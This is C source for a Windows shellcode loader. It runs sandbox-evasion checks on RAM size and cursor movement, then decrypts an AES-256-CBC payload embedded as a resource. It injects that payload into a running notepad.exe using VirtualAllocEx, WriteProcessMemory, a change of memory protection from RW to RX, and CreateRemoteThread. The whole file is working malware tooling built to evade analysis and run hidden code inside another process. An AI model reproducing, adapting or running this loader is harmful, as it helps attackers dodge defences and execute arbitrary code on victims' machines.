#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>   // For CreateToolhelp32Snapshot, Process32First/Next
#include "resource.h"
#include "aes.h"
#include "key.h"

BOOL is_sandbox() {
    // Check 1: RAM < 4GB = likely a sandbox/VM
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status); // Fill mem_status with info 
    DWORD ram_gb = (DWORD)(mem_status.ullTotalPhys / (1024 * 1024 * 1024));
    if (ram_gb < 4) {
        return TRUE;
    }

    // Check 2: cursor doesn't move = likely automated/sandbox
    POINT pos1, pos2;
    GetCursorPos(&pos1);
    Sleep(1000);
    GetCursorPos(&pos2);
    if (pos1.x == pos2.x && pos1.y == pos2.y) {
        return TRUE;
    }

    return FALSE;
}

// Helper: find PID of a process by name 
DWORD find_pid(const char *proc_name) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Snapshot all running processes
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed!\n");
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // Walk the process list
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, proc_name) == 0) { // Case-insensitive compare
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

int main () {
    if (is_sandbox()) {
        return 0; 
    }

    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // ============================================================
    // Step 0: Find notepad.exe PID
    // ============================================================
    DWORD pid = find_pid("notepad.exe");
    if (pid == 0) {
        printf("[!] notepad.exe not found! Make sure it's running.\n");
        return 1;
    }
    printf("[+] Found notepad.exe  PID: %lu\n", pid);

    // ============================================================
    // Step 1: OpenProcess — open an access tunnel to notepad
    //   PROCESS_VM_OPERATION  — needed for VirtualAllocEx
    //   PROCESS_VM_WRITE      — needed for WriteProcessMemory
    //   PROCESS_CREATE_THREAD — needed for CreateRemoteThread
    // ============================================================
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE,
        pid
    );
    if (hProcess == NULL) {
        printf("[!] OpenProcess failed! Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] OpenProcess success! Handle: 0x%p\n", hProcess);

    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    if (res == NULL) {
        printf("[!] FindResource failed!\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] FindResource success!\n");

    HGLOBAL res_data = LoadResource(NULL, res);
    if (res_data == NULL) {
        printf("[!] LoadResource failed!\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] LoadResource success!\n");

    LPVOID payload = LockResource(res_data);
    if (payload == NULL) {
        printf("[!] LockResource failed!\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] LockResource success!\n");

    DWORD payload_size = SizeofResource(NULL, res);
    printf("[+] Payload size: %lu bytes\n", payload_size);

    if (payload_size % 16 != 0) {
        printf("[!] WARNING: Payload size is NOT a multiple of 16! AES-CBC will fail.\n");
    }
    LPVOID local_buf = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (local_buf == NULL) {
        printf("[!] Local VirtualAlloc failed!\n");
        CloseHandle(hProcess);
        return 1;
    }
    RtlMoveMemory(local_buf, payload, payload_size); // Copy encrypted payload to local buffer
    printf("[+] Encrypted payload copied to local buffer.\n");

    printf("[*] Starting AES-256-CBC decryption...\n");
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t *)local_buf, payload_size);
    printf("[+] Payload decrypted locally (AES-256-CBC)!\n");

    // ============================================================
    // Step 2: VirtualAllocEx — carve out memory inside notepad.exe
    // ============================================================
    LPVOID remote_buf = VirtualAllocEx(
        hProcess,           // Handle from OpenProcess
        NULL,               // Let the OS pick the address
        payload_size,       // Size of shellcode
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE      // Start with RW (less suspicious than RWX)
    );
    if (remote_buf == NULL) {
        printf("[!] VirtualAllocEx failed! Error: %lu\n", GetLastError());
        VirtualFree(local_buf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] VirtualAllocEx success! Remote addr: 0x%p\n", remote_buf);

    // ============================================================
    // Step 3: WriteProcessMemory — write decrypted shellcode into notepad
    // ============================================================
    SIZE_T bytes_written = 0;
    rv = WriteProcessMemory(
        hProcess,           // Handle from OpenProcess
        remote_buf,         // Address from VirtualAllocEx
        local_buf,          // Decrypted shellcode buffer
        payload_size,       // Size
        &bytes_written
    );
    if (!rv) {
        printf("[!] WriteProcessMemory failed! Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remote_buf, 0, MEM_RELEASE);
        VirtualFree(local_buf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] WriteProcessMemory success! Bytes written: %llu\n", (unsigned long long)bytes_written);

    VirtualFree(local_buf, 0, MEM_RELEASE);

    rv = VirtualProtectEx(hProcess, remote_buf, payload_size, PAGE_EXECUTE_READ, &oldprotect);
    if (!rv) {
        printf("[!] VirtualProtectEx failed! Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remote_buf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] VirtualProtectEx success! (RW -> RX)\n");

    // ============================================================
    // Step 4: CreateRemoteThread — execute shellcode inside notepad
    // ============================================================
    th = CreateRemoteThread(
        hProcess,           // Handle from OpenProcess
        NULL,               // Default security
        0,                  // Default stack size
        (LPTHREAD_START_ROUTINE)remote_buf,  // Start at our shellcode
        NULL,               // No parameter
        0,                  // Run immediately
        NULL                // Don't need thread ID
    );
    if (th == NULL) {
        printf("[!] CreateRemoteThread failed! Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] CreateRemoteThread success! Shellcode is running inside notepad.exe!\n");

    WaitForSingleObject(th, INFINITE);
    CloseHandle(th);
    CloseHandle(hProcess);

    printf("[+] Done.\n");
    return 0;
}